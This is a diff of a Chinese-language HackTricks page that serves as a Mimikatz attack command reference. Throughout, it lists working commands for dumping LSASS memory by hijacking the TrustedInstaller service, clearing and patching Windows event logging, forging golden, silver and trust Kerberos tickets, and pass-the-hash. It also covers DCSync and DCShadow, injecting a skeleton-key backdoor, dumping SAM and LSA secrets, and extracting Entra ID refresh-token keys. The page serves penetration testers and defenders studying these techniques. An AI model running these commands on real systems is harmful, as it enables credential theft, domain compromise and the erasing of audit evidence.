@@ -3,230 +3,247 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-**本页面基于 [adsecurity.org](https://adsecurity.org/?page_id=1821) 的内容**。如需更多信息，请查看原文！<sup>[[3]](#references)</sup>
+**本页面基于 [adsecurity.org](https://adsecurity.org/?page_id=1821) 上的内容**。如需了解更多信息，请查看原文！<sup>[[3]](#references)</sup>
 
 ## 内存中的 LM 和明文
 
-从 Windows 8.1 和 Windows Server 2012 R2 开始，系统实施了重要措施，以防范凭据窃取：
+从 Windows 8.1 和 Windows Server 2012 R2 开始，系统实施了重要措施来防止凭据被盗：
 
-- **LM hashes 和 plain-text passwords** 不再存储在内存中，以增强安全性。必须将特定注册表设置 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0`，以禁用 Digest Authentication，确保 LSASS 中不会缓存 "clear-text" passwords。
+- **LM 哈希和明文密码**不再存储在内存中，以增强安全性。必须将特定注册表项 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ 配置为 DWORD 值 `0`，以禁用 Digest Authentication，确保 LSASS 不会缓存“明文”密码。
 
-- 引入 **LSA Protection**，用于防止未经授权读取 Local Security Authority (LSA) 进程的内存以及向其中注入代码。具体做法是将 LSASS 标记为 protected process。启用 LSA Protection 包括：
-1. 修改注册表 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_，将 `RunAsPPL` 设置为 `dword:00000001`。
-2. 实施一个 Group Policy Object (GPO)，在受管理设备上强制应用此注册表更改。
+- **LSA Protection** 已引入，用于保护 Local Security Authority (LSA) 进程免遭未授权的内存读取和代码注入。具体做法是将 LSASS 标记为受保护进程。启用 LSA Protection 的方法如下：
+  1. 修改 _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ 下的注册表项，将 `RunAsPPL` 设为 `dword:00000001`。
+  2. 实施 Group Policy Object (GPO)，在受管理的设备上强制应用此注册表更改。
 
-尽管存在这些保护措施，Mimikatz 等工具仍可使用特定 drivers 绕过 LSA Protection，但此类操作很可能会记录在 event logs 中。
+尽管有这些保护措施，Mimikatz 等工具仍可借助特定驱动绕过 LSA Protection，不过此类操作很可能会记录在事件日志中。
 
-在现代工作站上，这一点更加重要，因为在许多 Windows 11 22H2+ 和 Windows Server 2025 的已加入域、非 DC 系统中，**Credential Guard 默认处于启用状态**，而在全新安装的 Windows 11 22H2+ 系统中，**LSASS-as-PPL 默认处于启用状态**。实际上，这意味着 `sekurlsa::logonpasswords` 通常只能获得比旧有 tradecraft 预期更少的信息，operators 越来越多地转向 **offline minidumps**、**Kerberos key extraction (`sekurlsa::ekeys`)** 或面向 **CloudAP/PRT** 的 modules。关于防护措施，请查看 [Windows credentials protections](credentials-protections.md)。
+在现代工作站上，这一点尤为重要，因为**许多 Windows 11 22H2+ 和 Windows Server 2025 域加入的非 DC 系统默认启用了 Credential Guard**，而**全新安装的 Windows 11 22H2+ 默认启用了 LSASS-as-PPL**。实际上，这意味着 `sekurlsa::logonpasswords` 通常能获取到的材料比旧式技术预期的更少，操作人员也越来越多地转向**离线 minidump**、**Kerberos 密钥提取 (`sekurlsa::ekeys`)** 或**面向 CloudAP/PRT 的模块**。关于防护措施，请参阅 [Windows credentials protections](credentials-protections.md)。
 
-### 应对 SeDebugPrivilege Removal
+### 应对 SeDebugPrivilege 移除
 
-Administrators 通常拥有 SeDebugPrivilege，因此可以对 programs 进行 debug。可以限制此 privilege，以防止未经授权的 memory dumps；攻击者经常利用该技术从内存中提取 credentials。然而，即使移除此 privilege，TrustedInstaller account 仍可通过自定义的 service configuration 执行 memory dumps：
+管理员通常拥有 SeDebugPrivilege，因此能够调试程序。此权限可以被限制，以防止未经授权的内存转储；攻击者常用这种技术从内存中提取凭据。不过，即使移除了此权限，TrustedInstaller 帐户仍可通过自定义服务配置执行内存转储：
+
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-这允许将 `lsass.exe` 的内存转储到文件中，然后可以在另一台系统上对其进行分析以提取 credentials：
+
+这样可以将 `lsass.exe` 的内存转储到文件中，之后可在另一台系统上分析该文件以提取凭据：
+
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+
 ## Mimikatz 选项
 
-在 Mimikatz 中，Event log tampering 主要涉及两项操作：清除事件日志，以及对 Event service 进行 patch，以阻止记录新事件。以下是执行这些操作的命令：
+Mimikatz 中的事件日志篡改主要包括两种操作：清除事件日志，以及修补 Event 服务以阻止记录新事件。以下是执行这些操作的命令：
 
 #### 清除事件日志
 
-- **Command**：此操作旨在删除事件日志，从而增加追踪恶意活动的难度。
-- Mimikatz 的标准文档没有提供直接通过其命令行清除事件日志的命令。不过，事件日志 manipulation 通常需要使用 Mimikatz 之外的系统工具或脚本来清除特定日志（例如使用 PowerShell 或 Windows Event Viewer）。
+Mimikatz 确实提供了 `event::clear`。它会调用 Windows 事件日志清除 API，以清除所选的经典日志。默认日志为 `Security`；`/log:` 用于选择其他日志，调用者需要具备清除该日志的权限。这与 `event::drop` 不同，后者会尝试阻止写入新记录。<sup>[[4]](#references)</sup>
 
-#### Experimental Feature：对 Event Service 进行 Patching
+```bash
+mimikatz "event::clear /log:Security" exit
+```
 
-- **Command**：`event::drop`
-- 此 experimental command 用于修改 Event Logging Service 的行为，使其实际上无法记录新事件。
-- Example：`mimikatz "privilege::debug" "event::drop" exit`
+#### Experimental Feature: Patching the Event Service
 
-- `privilege::debug` 命令确保 Mimikatz 以修改系统服务所需的权限运行。
-- 随后，`event::drop` 命令会对 Event Logging service 进行 patch。
+- **命令**：`event::drop`
+- 这条实验性命令旨在修改 Event Logging Service 的行为，从而阻止其记录新事件。
+- 示例：`mimikatz "privilege::debug" "event::drop" exit`
 
-### Kerberos Ticket Attacks
+- `privilege::debug` 命令确保 Mimikatz 具备修改系统服务所需的权限。
+- `event::drop` 命令随后会对 Event Logging service 进行 patch。
 
-使用以下命令作为快速 syntax 参考。[golden tickets](../active-directory-methodology/golden-ticket.md)、[silver tickets](../active-directory-methodology/silver-ticket.md)、[diamond tickets](../active-directory-methodology/diamond-ticket.md) 以及 [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) 的专门页面包含最新的 AES/PAC/opsec 细节。
+### Kerberos Ticket 攻击
 
-### Golden Ticket Creation
+使用以下命令快速查阅语法。[golden tickets](../active-directory-methodology/golden-ticket.md)、[silver tickets](../active-directory-methodology/silver-ticket.md)、[diamond tickets](../active-directory-methodology/diamond-ticket.md) 和 [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) 的专门页面介绍了最新的 AES/PAC/opsec 细节。
 
-Golden Ticket 可实现整个 domain 范围内的访问 impersonation。关键命令和参数：
+### Golden Ticket 创建
 
-- Command：`kerberos::golden`
-- Parameters：
-- `/domain`：domain 名称。
-- `/sid`：domain 的 Security Identifier (SID)。
-- `/user`：要 impersonate 的用户名。
-- `/krbtgt`：domain 的 KDC service account 的 NTLM hash。
-- `/ptt`：直接将 ticket 注入内存。
-- `/ticket`：保存 ticket 供以后使用。
+Golden Ticket 可用于模拟身份，获取整个域的访问权限。关键命令和参数：
 
-Example：
+- 命令：`kerberos::golden`
+- 参数：
+  - `/domain`：域名。
+  - `/sid`：域的 Security Identifier (SID)。
+  - `/user`：要模拟的用户名。
+  - `/krbtgt`：域 KDC 服务帐户的 NTLM hash。
+  - `/ptt`：将 ticket 直接注入内存。
+  - `/ticket`：保存 ticket 以供后续使用。
+
+示例：
+
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+
 ### Silver Ticket Creation
 
-Silver Tickets grant access to specific services. Key command and parameters:
+Silver Ticket 可授予对特定服务的访问权限。关键命令和参数：
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-- `/service`: The service to target (e.g., cifs, http).
-- Other parameters similar to Golden Ticket.
+- 命令：与 Golden Ticket 类似，但目标是特定服务。
+- 参数：
+  - `/service`：要作为目标的服务（例如 cifs、http）。
+  - 其他参数与 Golden Ticket 类似。
 
-Example:
+示例:
+
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Trust Ticket Creation
 
-Trust Tickets 用于通过利用 trust relationships 访问跨域资源。关键命令和参数：
+### Trust Ticket 创建
 
-- Command: 与 Golden Ticket 类似，但用于 trust relationships。
-- Parameters:
-- `/target`: 目标 domain 的 FQDN。
-- `/rc4`: trust account 的 NTLM hash。
+Trust Ticket 用于利用信任关系跨域访问资源。关键命令和参数：
 
-Example:
+- 命令：类似于 Golden Ticket，但用于信任关系。
+- 参数：
+  - `/target`：目标域的 FQDN。
+  - `/rc4`：信任账户的 NTLM 哈希。
+
+示例：
+
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+
 ### Additional Kerberos Commands
 
-- **Listing Tickets**：
+- **列出 Tickets**：
 
-- Command: `kerberos::list`
-- 列出当前用户会话的所有 Kerberos tickets。
+  - 命令：`kerberos::list`
+  - 列出当前用户会话的所有 Kerberos tickets。
 
-- **Pass the Cache**：
+- **Pass the Cache**：`kerberos::ptc` 读取 MIT/Heimdal `.ccache` 文件，**不**读取 `.kirbi` 文件。将文件路径作为位置参数传入：`mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`。<sup>[[5]](#references)</sup>
 
-- Command: `kerberos::ptc`
-- 从 cache 文件中注入 Kerberos tickets。
-- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **Pass the Ticket**：`kerberos::ptt` 读取 `.kirbi` 文件或包含此类文件的目录。它同样使用位置路径，而不是 `/ticket:`：`mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`。更完整的工作流程请参阅 [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md)。<sup>[[6]](#references)</sup>
 
-- **Pass the Ticket**：
-
-- Command: `kerberos::ptt`
-- 允许在另一个会话中使用 Kerberos ticket。
-- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
-
-- **Purge Tickets**：
-- Command: `kerberos::purge`
-- 从会话中清除所有 Kerberos tickets。
-- 在使用 ticket manipulation 命令之前很有用，可以避免冲突。
+- **清除 Tickets**：
+  - 命令：`kerberos::purge`
+  - 清除会话中的所有 Kerberos tickets。
+  - 在使用 ticket 操作命令前很有用，可避免冲突。
 
 ### Over-Pass-the-Hash / Pass-the-Key
 
-如果 `RC4` 已禁用或不可靠，Mimikatz 可以将 **AES128/AES256 Kerberos keys** patch 到当前 logon session 中，而不是仅使用 NT hash。与其将 `sekurlsa::pth` 视为仅适用于 NTLM，这种方式通常更适合现代 domain。<sup>[[1]](#references)</sup>
+如果 `RC4` 已禁用或不可靠，Mimikatz 可以将 **AES128/AES256 Kerberos keys** 注入当前登录会话，而不只是使用 NT hash。与将 `sekurlsa::pth` 视为仅适用于 NTLM 的命令相比，这通常更适合现代域。<sup>[[1]](#references)</sup>
+
 ```bash
 mimikatz "privilege::debug" "sekurlsa::ekeys" exit
 mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
 mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
 ```
-`/impersonate` 会复用当前进程，而不是生成新的 console；当你想在相同 context 中立即运行 `lsadump::dcsync` 之类的命令时，这非常方便。
 
-### Active Directory Tampering
+`/impersonate` 会复用当前进程，而不是启动新的控制台；如果你想在同一上下文中立即运行 `lsadump::dcsync` 等命令，这会很方便。
+
+### Active Directory 篡改
 
 - **DCShadow**：暂时让一台机器充当 DC，以操纵 AD 对象。参见 [DCShadow](../active-directory-methodology/dcshadow.md)。
 
-- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**：模拟 DC 以请求密码数据。参见 [DCSync](../active-directory-methodology/dcsync.md)。
-- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+- **DCSync**：模拟 DC，以请求密码数据。参见 [DCSync](../active-directory-methodology/dcsync.md)。
+  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### 凭据访问
 
-- **LSADUMP::LSA**：从 LSA 中提取凭据。
+- **LSADUMP::LSA**：从 LSA 提取凭据。
 
-- `mimikatz "lsadump::lsa /inject" exit`
+  - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**：使用计算机账户的密码数据来冒充 DC。
+- **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。
 
-- _原始上下文未提供 NetSync 的具体命令。_
+  - _原始上下文中未提供 NetSync 的具体命令。_
 
 - **LSADUMP::SAM**：访问本地 SAM 数据库。
 
-- `mimikatz "lsadump::sam" exit`
+  - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**：解密存储在注册表中的 secrets。
+- **LSADUMP::Secrets**：解密存储在注册表中的机密。
 
-- `mimikatz "lsadump::secrets" exit`
+  - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**：为用户设置新的 NTLM hash。
+- **LSADUMP::SetNTLM**：为用户设置新的 NTLM 哈希。
 
-- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**：获取 trust authentication information。
-- `mimikatz "lsadump::trust" exit`
+- **LSADUMP::Trust**：检索信任身份验证信息。
+  - `mimikatz "lsadump::trust" exit`
 
-### Cloud credentials / Entra ID
+### 云凭据 / Entra ID
 
-在 **Entra ID** 或 **hybrid-joined** 主机上，`sekurlsa::cloudap` 可以从 LSASS 中暴露缓存的 **Primary Refresh Token (PRT)** material。如果关联的 Proof-of-Possession key 受到 software protection，`dpapi::cloudapkd` 可以派生后续 **Pass-the-PRT** workflows 所需的 clear/derived key material。<sup>[[1]](#references)</sup>
+在 **Entra ID** 或 **混合加入**的主机上，`sekurlsa::cloudap` 可以从 LSASS 中提取缓存的 **Primary Refresh Token (PRT)** 材料。其 `ProofOfPossesionKey.KeyValue` 是受 DPAPI 保护的会话密钥 blob，而不是已经解密的密钥。<sup>[[7]](#references)[[8]](#references)</sup> 若要使用 `/unprotect`，请以 `SYSTEM` 身份运行 `dpapi::cloudapkd`（例如，在提升权限的 Mimikatz 会话中运行 `token::elevate`），或者先使用 `sekurlsa::dpapi` 填充 Mimikatz 的密钥缓存。仅运行 `privilege::debug` 不会切换 DPAPI 调用者上下文。<sup>[[8]](#references)</sup>
+
 ```bash
-mimikatz "privilege::debug" "sekurlsa::cloudap" exit
-mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
+mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
 mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
 ```
-当 key 由 TPM-backed 时，这会变得困难得多，但在 hybrid endpoints 上仍值得检查，因为缓存的 CloudAP 数据可能比经典的 `wdigest` 输出更有价值。<sup>[[2]](#references)</sup> 有关 cloud-side abuse chain，请参阅 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)。
 
-### Miscellaneous
+复制第一条命令中的**匹配项** `Context` 和 `Derived Key` 到第二条命令中；如果未提供 context，Mimikatz 会生成新的 context。即使密钥受 TPM 保护，Mimikatz 也可能通过在原设备上使用 TPM 来派生签名密钥。无需导出明文密钥，但成功派生密钥后即可对浏览器 cookie 签名。<sup>[[7]](#references)</sup>
 
-- **MISC::Skeleton**：向 DC 上的 LSASS 注入 backdoor。
-- `mimikatz "privilege::debug" "misc::skeleton" exit`
+单独的 PRT 字符串并不足够，因为 Microsoft Entra 要求证明持有相关联的会话密钥。<sup>[[9]](#references)</sup> 有关其他主密钥选项，请参阅 [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md)；有关云端攻击链，请参阅 [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html)。
 
-### Privilege Escalation
+### 杂项
 
-- **PRIVILEGE::Backup**：获取 backup 权限。
+- **MISC::Skeleton**：向 DC 上的 LSASS 注入后门。
+  - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- `mimikatz "privilege::backup" exit`
+### 权限提升
 
-- **PRIVILEGE::Debug**：获取 debug 权限。
-- `mimikatz "privilege::debug" exit`
+- **PRIVILEGE::Backup**：获取备份权限。
 
-### Credential Dumping
+  - `mimikatz "privilege::backup" exit`
 
-- **SEKURLSA::LogonPasswords**：显示已登录用户的 credentials。
+- **PRIVILEGE::Debug**：获取调试权限。
+  - `mimikatz "privilege::debug" exit`
 
-- `mimikatz "sekurlsa::logonpasswords" exit`
+### 凭据转储
 
-- **SEKURLSA::Tickets**：从内存中提取 Kerberos tickets。
-- `mimikatz "sekurlsa::tickets /export" exit`
+- **SEKURLSA::LogonPasswords**：显示已登录用户的凭据。
 
-### Sid and Token Manipulation
+  - `mimikatz "sekurlsa::logonpasswords" exit`
+
+- **SEKURLSA::Tickets**：从内存中提取 Kerberos 票据。
+  - `mimikatz "sekurlsa::tickets /export" exit`
+
+### SID 和令牌操纵
 
 - **SID::add/modify**：更改 SID 和 SIDHistory。
 
-- Add：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modify：_原始上下文中未提供用于 modify 的特定命令。_
+  - 添加：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+  - 修改：_原始上下文中没有专门用于修改的命令。_
 
-- **TOKEN::Elevate**：冒充 tokens。
-- `mimikatz "token::elevate /domainadmin" exit`
+- **TOKEN::Elevate**：冒充令牌。
+  - `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### 终端服务
 
-- **TS::MultiRDP**：允许多个 RDP sessions。
+- **TS::MultiRDP**：允许多个 RDP 会话。
 
-- `mimikatz "ts::multirdp" exit`
+  - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**：列出 TS/RDP sessions。
-- _原始上下文中未提供用于 TS::Sessions 的特定命令。_
+- **TS::Sessions**：列出 TS/RDP 会话。
+  - _未提供 TS::Sessions 的具体命令。_
 
 ### Vault
 
-- 从 Windows Vault 中提取 passwords。
-- `mimikatz "vault::cred /patch" exit`
+- 从 Windows Vault 中提取密码。
+  - `mimikatz "vault::cred /patch" exit`
+
+
 
 
 ## References
 
-- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
-- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
-- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)
-
+- [1] [The Hacker Tools – Mimikatz 模块](https://tools.thehacker.recipes/mimikatz/modules/)
+- [2] [Synacktiv – WHFB 和 Entra ID：认识全新的缓存流程](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
+- [3] [Mimikatz 命令参考](https://adsecurity.org/?page_id=1821)
+- [4] [Mimikatz event 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
+- [5] [Mimikatz ccache 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
+- [6] [Mimikatz Kerberos 模块源代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
+- [7] [Mimikatz CloudAP DPAPI 实现](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
+- [8] [进一步探究 Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
+- [9] [Microsoft Entra Primary Refresh Token 保护机制](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
 {{#include ../../banners/hacktricks-training.md}}
